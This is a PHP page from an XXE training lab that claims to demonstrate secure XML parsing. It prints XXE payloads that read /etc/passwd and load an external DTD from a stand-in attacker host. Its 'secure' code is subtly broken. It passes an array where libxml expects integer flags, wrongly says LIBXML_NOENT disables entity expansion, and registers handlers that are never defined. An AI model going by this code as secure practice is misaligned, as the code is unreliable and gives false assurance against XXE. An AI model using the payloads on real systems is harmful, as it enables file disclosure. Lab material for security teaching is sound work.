<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 8 - Secure Implementation</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab demonstrates the secure way to parse XML in PHP. All XXE vulnerabilities have been 
                    fixed by properly configuring the XML parser with security settings.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Secure XML parsing configuration
                $internalErrors = libxml_use_internal_errors(true);
                libxml_disable_entity_loader(true);
                
                $parser = xml_parser_create();
                xml_set_element_handler($parser, 'start_element', 'end_element');
                
                // Configure parser security settings
                $options = [
                    LIBXML_NONET => true,      // Disable network access
                    LIBXML_NOENT => false,     // Do not expand entities
                    LIBXML_DTDLOAD => false,   // Do not load external DTD
                    LIBXML_DTDVALID => false   // Do not validate against DTD
                ];
                
                $result = simplexml_load_string($xml, 'SimpleXMLElement', $options);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    $errors = libxml_get_errors();
                    foreach ($errors as $error) {
                        echo '<pre>' . htmlspecialchars($error->message) . '</pre>';
                    }
                    echo '</div>';
                }
                
                libxml_use_internal_errors($internalErrors);
            }
            ?>

            <div style="margin: 20px 0; padding: 15px; background: #d4edda; border-radius: 5px; border-left: 3px solid #28a745;">
                <h3>🔒 Secure XML Parsing Settings</h3>
                <p>These are the security configurations used to prevent XXE attacks:</p>
                
                <h4>PHP Configuration:</h4>
                <pre style="background: white; padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 14px; margin: 10px 0;">
// Secure XML parsing settings
$options = [
    LIBXML_NONET => true,      // Disable network access
    LIBXML_NOENT => false,     // Do not expand entities
    LIBXML_DTDLOAD => false,   // Do not load external DTD
    LIBXML_DTDVALID => false   // Do not validate against DTD
];

// Using DOMDocument with secure settings
$dom = new DOMDocument();
$dom->loadXML($xml, $options);

// Or with SimpleXML
$simplexml = simplexml_load_string($xml, 'SimpleXMLElement', $options);
                </pre>
                
                <h4>Key Security Measures:</h4>
                <ul style="margin-left: 20px; margin-top: 10px;">
                    <li><strong>LIBXML_NONET:</strong> Disables network access for external resources</li>
                    <li><strong>LIBXML_NOENT:</strong> Disables entity expansion</li>
                    <li><strong>LIBXML_DTDLOAD:</strong> Prevents loading external DTD files</li>
                    <li><strong>LIBXML_DTDVALID:</strong> Disables DTD validation</li>
                    <li><strong>libxml_disable_entity_loader:</strong> Prevents external entity loading</li>
                </ul>
            </div>

            <div class="examples">
                <h3>💡 Why This is Secure:</h3>
                
                <h4>Entity Expansion Blocked:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>  <!-- This will NOT be expanded -->
</data>'); ?></pre>
                
                <h4>External Resources Blocked:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data SYSTEM "http://evil.example.com/dtd">
<data>
    <content>&external;</content>  <!-- This will fail to load -->
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Best Practices:</h3>
                <ul>
                    <li>Always disable external entity resolution</li>
                    <li>Use LIBXML_NONET to block network access</li>
                    <li>Disable DTD loading and validation</li>
                    <li>Use modern XML parsers with secure defaults</li>
                    <li>Avoid using old, insecure functions like simplexml_load_string() without settings</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
